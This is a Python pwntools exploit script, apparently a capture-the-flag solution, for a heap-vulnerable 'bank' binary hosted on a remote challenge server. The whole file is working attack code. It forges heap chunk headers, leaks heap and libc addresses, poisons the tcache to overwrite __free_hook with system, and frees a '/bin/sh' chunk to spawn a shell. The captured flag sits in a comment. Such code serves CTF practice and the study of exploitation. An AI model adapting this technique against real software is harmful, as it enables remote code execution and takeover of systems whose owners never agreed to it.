from pwn import *

# r = process('./bank')
r = remote('52.59.124.14', 10200)
bin = ELF('./bank')
libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.31.so')
context.clear(os='linux', arch='x86_64', log_level='DEBUG')

def create(name):
    r.sendlineafter(b'=> ', b'1')
    r.sendafter(b'Enter a name for your account: \n', name)

def delete(idx):
    r.sendlineafter(b'=> ', b'2')
    r.sendlineafter(b'you want to delete: ', str(idx).encode())

def view(idx):
    r.sendlineafter(b'=> ', b'3')
    r.sendlineafter(b'you want to view: ', str(idx).encode())

def get_a_loan(amount, idx):
    r.sendlineafter(b'=> ', b'4')
    r.sendlineafter(b'would like to borrow: ', str(amount).encode())
    r.sendlineafter(b'to receive loan: ', str(idx).encode())

def transfer_money(sender, receiver, amount):
    r.sendlineafter(b'=> ', b'5')
    r.sendlineafter(b'want to send money from: ', str(sender).encode())
    r.sendlineafter(b'want to send the money to: ', str(receiver).encode())
    r.sendlineafter(b'amount: ', str(amount).encode())

# with open('/proc/%d/maps' % r.pid, 'r') as f:
#     base = int(f.read(12), 16)

# log.info('Base: %#x' % base)

# def debug():
#     gdb.attach(r, '''b*%d''' % (base + 0x1805))

create(b'\x00'*0x10 + p64(0x421))
create(b'\x00'*0xe0 + p64(0x111))
create(b'2')
delete(0)
delete(1)
get_a_loan(2, 2)
transfer_money(2, 1, 2)
create(b'0')
create(b'1')
delete(2)
delete(1)
create(b'1'*0x20)
view(1)
r.recvuntil(b'1'*0x20)
heap = u64(r.recv(6).ljust(8, b'\x00')) - 0x10
log.info('Heap base: %#x' % heap)

create(b'2')
create(b'3')
create(b'4')
create(b'5')
delete(5)
delete(1)
delete(0)
create(b'\x00'*0xe0 + p64(0x111) + p64(heap + 0x2c0))

create(b'1')
create(b'5')
delete(5)

create(b'5')
view(5)
r.recvuntil(b'Name: ')
libc.address = u64(r.recv(6).ljust(8, b'\x00')) - 0x1ecf35
log.info('Libc base: %#x' % libc.address)

delete(4)
delete(1)
delete(0)
create(b'\x00'*0xe0 + p64(0x111) + p64(libc.symbols['__free_hook']-0x10))
delete(5)
create(b'\x00'*0xe0 + p64(0x111) + b'/bin/sh\x00')
create(b'2')
create(p64(0) + p64(libc.symbols['system']))
# debug()
delete(0)
r.interactive()
# ENO{0h_uh_3n0_b4nk_h45_4_53cur17y_155u3i}
# view(3)
# view(4)